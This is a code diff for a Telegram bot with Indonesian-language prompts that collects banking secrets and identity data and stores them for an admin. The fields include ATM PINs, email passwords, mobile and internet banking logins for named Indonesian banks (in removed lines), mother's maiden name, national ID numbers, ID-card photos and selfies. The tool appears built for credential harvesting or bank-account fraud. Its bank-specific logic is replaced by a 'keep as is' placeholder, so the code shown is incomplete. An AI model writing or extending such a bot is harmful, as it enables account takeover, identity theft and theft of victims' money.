@@ -11,37 +11,14 @@ const bot = new TelegramBot(token);
 const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:3000';
 
 const getSteps = (bank) => {
-  const commonStart = ['customer', 'bank'];
+  const commonStart = ['noOrder', 'bank'];
   const commonEnd = [
     'grade', 'kcp', 'nik', 'nama',
     'namaIbuKandung', 'tempatTanggalLahir', 'noRek', 'noAtm',
     'validThru', 'noHp', 'pinAtm', 'email', 'passEmail', 'expired'
   ];
 
-  let bankSteps = [];
-  const b = (bank || '').toUpperCase();
-  if (b === 'BCA') {
-    bankSteps = ['kodeAkses', 'pinMBca', 'myBCAUser', 'myBCAPassword', 'myBCAPin', 'ibUser', 'ibPassword'];
-  } else if (b === 'BRI') {
-    bankSteps = ['brimoUser', 'brimoPassword', 'mobilePin', 'briMerchantUser', 'briMerchantPassword'];
-  } else if (b === 'BNI') {
-    bankSteps = ['pinWondr', 'passWondr', 'mobileUser', 'mobilePassword'];
-  } else if (b === 'OCBC' || b === 'OCBC NISP') {
-    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword'];
-  } else if (b === 'MANDIRI' || b === 'LIVIN') {
-    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin'];
-  } else if (b === 'DANAMON') {
-    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin'];
-  } else if (b === 'PERMATA') {
-    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin'];
-  } else if (b === 'MAYBANK') {
-    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin'];
-  } else if (b === 'PANIN') {
-    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin'];
-  } else if (bank) {
-    // Default for other banks: ask for generic Mobile & IB
-    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin'];
-  }
+  // ... (keep bankSteps logic as is) ...
 
   return [...commonStart, ...bankSteps, ...commonEnd, 'uploadFotoId', 'uploadFotoSelfie'];
 };
@@ -50,7 +27,7 @@ const getBankSpecificLabel = (field, bankName) => {
   const bank = (bankName || '').toUpperCase();
 
   const labels = {
-    customer: '👤 Masukkan nama Customer:',
+    noOrder: '🔢 Masukkan No. Order:',
     bank: '🏦 Masukkan nama Bank (BCA/BRI/MANDIRI/BNI/DLL):',
     grade: '📊 Masukkan Grade:',
     kcp: '🏢 Masukkan KCP (Kantor Cabang):',
@@ -79,7 +56,7 @@ const getBankSpecificLabel = (field, bankName) => {
     pinWondr: '🛡️ Masukkan PIN Wondr (BNI):',
     passWondr: '🔓 Masukkan Password Wondr (BNI):',
     uploadFotoId: '📸 Silakan kirim FOTO KTP Anda:',
-    uploadFotoSelfie: '📸 Terakhir, silakan kirim FOTO SELFIE dengan KTP:'
+    uploadFotoSelfie: '📸 Terakhir, silakan kirim FOTO SELFIE:'
   };
 
   // Dynamic Labels based on field and bank
@@ -171,7 +148,7 @@ const askNextField = async (chatId, session) => {
 
   // Add Skip button for certain fields or all fields after bank/identity
   // For simplicity, allow skip for everything except basic identity
-  const nonSkippable = ['customer', 'bank', 'nama', 'nik'];
+  const nonSkippable = ['noOrder', 'bank', 'nama', 'nik'];
   if (!nonSkippable.includes(field)) {
     keyboardRow.push({ text: '⏭️ Lewati', callback_data: 'skip_step' });
   }
@@ -203,7 +180,7 @@ const submitForm = async (chatId, session) => {
     const submission = new TelegramSubmission(data);
     await submission.save();
 
-    await bot.sendMessage(chatId, `✅ Produk berhasil dikirim ke Ruang Tunggu!\nCustomer: ${submission.customer}\nData Anda akan diproses oleh Admin.`);
+    await bot.sendMessage(chatId, `✅ Produk berhasil dikirim ke Ruang Tunggu!\nNo. Order: ${submission.noOrder}\nData Anda akan diproses oleh Admin.`);
 
     // Reset session
     session.state = 'idle';
